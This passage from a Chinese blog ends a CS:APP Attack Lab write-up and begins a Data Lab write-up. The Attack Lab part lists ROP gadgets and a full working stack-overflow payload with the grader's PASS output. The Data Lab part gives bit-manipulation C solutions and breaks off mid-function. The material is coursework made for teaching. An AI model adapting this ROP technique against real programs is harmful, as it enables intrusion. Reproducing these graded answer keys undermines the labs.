<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a33 &lt;getval_159&gt;:</span><br><span class="line">  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax</span><br><span class="line">  401a38:	c3                   	retq   </span><br><span class="line">  ;取出89 d1 38 c9 c3-----&gt;</span><br><span class="line">  ;movl %edx,%ecx  </span><br><span class="line">  ;cmpb %cl,%cl(无意义，不影响)</span><br><span class="line">  ;ret</span><br></pre></td></tr></table></figure>

<p>再将偏移量xx从%ecx传递给%esi</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a25 &lt;addval_187&gt;:</span><br><span class="line">  401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax</span><br><span class="line">  401a2b:	c3                   	retq   </span><br><span class="line">  ;取出89 ce 38 c0 c3----&gt;</span><br><span class="line">  ;movl %ecx,%esi</span><br><span class="line">  ;cmpb %al,%al(无意义，不影响)</span><br><span class="line">  ;ret</span><br></pre></td></tr></table></figure>

<p>成功将偏移量xx和栈顶地址都传递到了%rsi和%rdi</p>
<p>任何跳转执行add_xy，计算字符串cookie的首地址并存放到%rax</p>
<p>将字符串cookie的首地址从%rax传递到%rdi:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:	c3                   	retq   </span><br><span class="line">  ;取出48 89 c7 c3----&gt;</span><br><span class="line">  ;movq %rax,%rdi</span><br><span class="line">  ;ret</span><br></pre></td></tr></table></figure>

<p>至此参数传递完成</p>
<p>最后在栈中存放一个touch3的函数入口地址用于程序跳转。</p>
<p>综上所属，第五阶段的答案为：(；之后的内容为注释，不是答案主体)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61 61 61 61  ;----&gt;填满缓冲区</span><br><span class="line">06 1a 40 00 00 00 00 00        ;----&gt;movq %rsp,%rax（此处为“栈顶”）</span><br><span class="line">c5 19 40 00 00 00 00 00        ;----&gt;mov %rax,%rdi</span><br><span class="line">cc 19 40 00 00 00 00 00        ;popq %rax</span><br><span class="line">48 00 00 00 00 00 00 00        ;从栈顶到cookie的偏移量</span><br><span class="line">42 1a 40 00 00 00 00 00		  ;movl %eax,%edx</span><br><span class="line">34 1a 40 00 00 00 00 00       ;mov %edx,%ecx</span><br><span class="line">27 1a 40 00 00 00 00 00       ;mov %ecx,%esi</span><br><span class="line">d6 19 40 00 00 00 00 00       ;lea  (%rdi,%rsi,1),%rax</span><br><span class="line">c5 19 40 00 00 00 00 00       ;movq %rax,%rdi</span><br><span class="line">fa 18 40 00 00 00 00 00       ;touch3地址</span><br><span class="line">35 39 62 39 39 37 66 61       ;字符串cookie</span><br></pre></td></tr></table></figure>

<p>执行结果如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root:~/csappLab3/target1<span class="comment"># ./hex2raw &lt; rtargetl2.txt | ./rtarget -q</span></span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(<span class="string">&quot;59b997fa&quot;</span>)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:3:61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 42 1A 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 27 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 </span><br></pre></td></tr></table></figure>





<p>至此，attackLab就全部结束了，我个人认为这个实验的内容非常有趣，通过利用栈溢出来展开不同的攻击，并且在实验过程中进一步地巩固了对于栈以及字节序的知识。前面四个阶段的内容难度都比较适中，但是最后一个实验却很难，主要原因在于我先入为主的以为ROP使用的全部代码都需要“截取”得到，却没想到lea是一个完整现成的可用模块，在这一点上耗费了大量的时间。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/03/csapp-dateLab/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/avatar.png">
      <meta itemprop="name" content="wwow">
      <meta itemprop="description" content="努力可能会成功，但不努力真的很舒服">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wwow's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/03/csapp-dateLab/" class="post-title-link" itemprop="url">csapp-dateLab</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-09-03 16:08:50" itemprop="dateCreated datePublished" datetime="2020-09-03T16:08:50+08:00">2020-09-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-09-04 16:50:24" itemprop="dateModified" datetime="2020-09-04T16:50:24+08:00">2020-09-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/csapp/" itemprop="url" rel="index"><span itemprop="name">csapp</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="CSAPP-DateLab"><a href="#CSAPP-DateLab" class="headerlink" title="CSAPP-DateLab"></a>CSAPP-DateLab</h3><p>DateLab是csapp的第一个课程实验，从csapp的官网上下载实验的压缩包。</p>
<p>我们需要填写代码压缩包中的bits.c文件</p>
<p>本次实验通过C语言完成，但是对于C语言某些特性和操作符的使用有严格限制(基本只能使用位运算)。</p>
<p>具体要求如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//expr可以由以下元素构成:</span></span><br><span class="line"><span class="comment">//0~255的int常量</span></span><br><span class="line"><span class="comment">//函数参数和局部变量</span></span><br><span class="line"><span class="comment">//！ ~</span></span><br><span class="line"><span class="comment">// &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//不能做的事:</span></span><br><span class="line"><span class="comment">//使用if,do,while,for,switch等控制语句</span></span><br><span class="line"><span class="comment">//定义和使用宏</span></span><br><span class="line"><span class="comment">//定义额外的函数</span></span><br><span class="line"><span class="comment">//调用函数</span></span><br><span class="line"><span class="comment">//使用其他运算符，例如&amp;&amp; || -,or ?</span></span><br><span class="line"><span class="comment">//使用强制类型转换</span></span><br><span class="line"><span class="comment">//使用除了int外的其他数据类型(例如数组，结构和联合)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//可以提供的前提条件：</span></span><br><span class="line"><span class="comment">//int为32位且由补码表示</span></span><br><span class="line"><span class="comment">//右移为算术右移</span></span><br><span class="line"><span class="comment">//当移位数小于0或大于31时，会出现不可预测的情况</span></span><br></pre></td></tr></table></figure>

<p>以上要求是在所有函数中都必须遵守的，但是不同的函数中会有更多的限制。</p>
<p><strong>在测试前先使用压缩包中的dlc程序来检测你的代码是否打破了上述规则</strong></p>
<p>每个函数上部有具体的操作限制：</p>
<p>​    legal ops–&gt;允许使用的操作符</p>
<p>​    Max ops—&gt;函数中允许使用的操作符数量上限</p>
<h3 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* bitXor - x^y using only ~ and &amp; </span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//tl将在x中为0,在y中为1的位置为1</span></span><br><span class="line">  <span class="comment">//tl将在x中为1,在x中为0的位置为1</span></span><br><span class="line">  <span class="comment">//~tl &amp; ~tr 将所有在tl和tr中都为0的位置为1,可以将它看作~(tl|tr)</span></span><br><span class="line">  <span class="keyword">int</span> tl=~x&amp;y;</span><br><span class="line">  <span class="keyword">int</span> tr=~y&amp;x;</span><br><span class="line">  <span class="keyword">int</span> ans=~(~tl &amp; ~tr);</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//返回二进制补码的最小值</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ans=<span class="number">0x1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//如果x是最大的二进制补码则返回1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//想了非常多的办法，但是仍然无法区分0x7FFFFFFF和0xFFFFFFFF(心累...</span></span><br><span class="line">  <span class="comment">//将等式分成两个部分 ~(x+x+1) 和 !(x+1)</span></span><br><span class="line">  <span class="comment">//要返回1  则有两种组合 ~(x+x+1)=-1,!(x+1)=1,或者是 ~(x+x+1)=!(x+1)=0</span></span><br><span class="line">  <span class="comment">//讨论第一种组合，要使！(x+1)=1 则x=0xFFFFFFFF,代入~(x+x+1)=0,所以不存在数x能够满足第一种组合</span></span><br><span class="line">  <span class="comment">//讨论第二种组合，要使~(x+x+1)=0,x=0xFFFFFFFF或0x7FFFFFFF, 而要同时满足!(x+1)=0则只有x=0x7FFFFFFF</span></span><br><span class="line">  <span class="keyword">return</span> !(~(x+x+<span class="number">1</span>)+!(x+<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//x的偶数位如果全为1则返回1，反之返回0</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//让x和0xAAAAAAAA想与后减去0xAAAAAAAA,若结果为0则正确，反之错误</span></span><br><span class="line">  <span class="keyword">int</span> tst=<span class="number">0xAA</span>;</span><br><span class="line">  <span class="keyword">int</span> base=<span class="number">0xAA</span>;</span><br><span class="line">  tst=(tst&lt;&lt;<span class="number">8</span>)+base;</span><br><span class="line">  tst=(tst&lt;&lt;<span class="number">8</span>)+base;</span><br><span class="line">  tst=(tst&lt;&lt;<span class="number">8</span>)+base;</span><br><span class="line">  <span class="keyword">return</span> !((x&amp;tst)+(~tst+<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> * negate - <span class="keyword">return</span> -x </span><br><span class="line"> *   Example: negate(<span class="number">1</span>) = <span class="number">-1.</span></span><br><span class="line"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="line"> *   Max ops: <span class="number">5</span></span><br><span class="line"> *   Rating: <span class="number">2</span></span><br><span class="line"> */</span><br><span class="line"><span class="keyword">int</span> negate(<span class="keyword">int</span> x) &#123;</span><br><span class="line">  <span class="keyword">return</span> ~x+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//3</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//如果x在0x30和0x39之间则返回1，反之返回0</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123; </span><br><span class="line">  <span class="comment">//先拆分高位的3进行确认，然后查看低位</span></span><br><span class="line">  <span class="comment">//当低位0~7时，有lres=0,llf≠0</span></span><br><span class="line">  <span class="comment">//低位8~9时，lres≠0，llf=0  (ltmp=0--&gt; lres=0)</span></span><br><span class="line">  <span class="comment">//低位A~F时，lres≠0,llf≠0,且lres&amp;llf≠0,  这时lres=6,最终llf=2或4或6</span></span><br><span class="line">  <span class="keyword">int</span> high=x&gt;&gt;<span class="number">4</span>;</span><br><span class="line">  <span class="keyword">int</span> low=x&amp;<span class="number">0xF</span>;</span><br><span class="line">  <span class="keyword">int</span> hres=high^<span class="number">3</span>;   </span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> ltmp=low&amp;<span class="number">8</span>;     </span><br><span class="line">  <span class="keyword">int</span> lres=(ltmp&gt;&gt;<span class="number">1</span>)+(ltmp&gt;&gt;<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">int</span> llf=(low+(~<span class="number">8</span>+<span class="number">1</span>))&amp;<span class="number">0xE</span>;</span><br><span class="line">  <span class="keyword">return</span> !(hres | (lres&amp;llf));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//实现条件表达式x?y:z</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;  </span><br><span class="line">  <span class="comment">//x=0--&gt;return z  x≠0--&gt;return y</span></span><br><span class="line">  <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">  ans=ans+((~(!x+(~<span class="number">0</span>)))&amp;z);  <span class="comment">//当x=0 ans+=z  当x≠0 ans+=0</span></span><br><span class="line">  ans=ans+((!x+(~<span class="number">0</span>))&amp;y);    <span class="comment">//当x=0 ans+=y  当x≠0 ans+=0</span></span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> * isLessOrEqual - <span class="keyword">if</span> x &lt;= y  then <span class="keyword">return</span> <span class="number">1</span>, <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span> </span><br><span class="line"> *   Example: isLessOrEqual(<span class="number">4</span>,<span class="number">5</span>) = <span class="number">1.</span></span><br><span class="line"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="line"> *   Max ops: <span class="number">24</span></span><br><span class="line"> *   Rating: <span class="number">3</span></span><br><span class="line"> */</span><br><span class="line"> <span class="comment">//实现if x &lt;= y  then return 1, else return 0 </span></span><br><span class="line"><span class="keyword">int</span> isLessOrEqual(<span class="keyword">int</span> x, <span class="keyword">int</span> y) &#123;  </span><br><span class="line">  <span class="comment">//直接做减法会出现溢出导致错误</span></span><br><span class="line">  <span class="comment">//将异号的情况先单独讨论，再对同号的情况使用减法判断大小</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> ls=~((x&amp;(~y))&gt;&gt;<span class="number">31</span>)+<span class="number">1</span>;  <span class="comment">//x&lt;0 y&gt;=0 ls=1   否则ls=0</span></span><br><span class="line">  <span class="keyword">int</span> gt=!((y&amp;(~x))&gt;&gt;<span class="number">31</span>);   <span class="comment">//x&gt;=0 y&lt;0 gt=0 否则gt=1</span></span><br><span class="line">  <span class="comment">//可以看到 当x,y异号时, ls==gt ,同号时ls^gt=1,这一特点会在最后一步使用到</span></span><br><span class="line">  <span class="keyword">int</span> Tmin=~(<span class="number">1</span>&lt;&lt;<span class="number">31</span>);</span><br><span class="line">  <span class="keyword">int</span> tmpx=x&amp;Tmin;</span><br><span class="line">  <span class="keyword">int</span> tmpy=y&amp;Tmin;</span><br><span class="line">  <span class="keyword">int</span> cmp=~((tmpy+(~tmpx+<span class="number">1</span>))&gt;&gt;<span class="number">31</span>);  </span><br><span class="line">  <span class="comment">//先除去符号位做减法比较大小,</span></span><br><span class="line">  <span class="comment">//然后根据符号位反转结果，只有在x,y同号时才考虑cmp，其他情况它会被忽略</span></span><br><span class="line">  <span class="keyword">int</span> ans=(ls&amp;gt)+((ls^gt)&amp;cmp);</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of </span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 实现!操作符</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;     </span><br><span class="line"><span class="comment">//除0外的数全部弄成负数然后右移31位,最后+1 </span></span><br><span class="line"><span class="comment">//利用-0=0的特点</span></span><br><span class="line">  <span class="keyword">int</span> ans=((x|(~x+<span class="number">1</span>))&gt;&gt;<span class="number">31</span>)+<span class="number">1</span>;  <span class="comment">//x=0 ans--&gt;1  其他ans=0</span></span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two&#x27;s complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4     0000 0005</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span 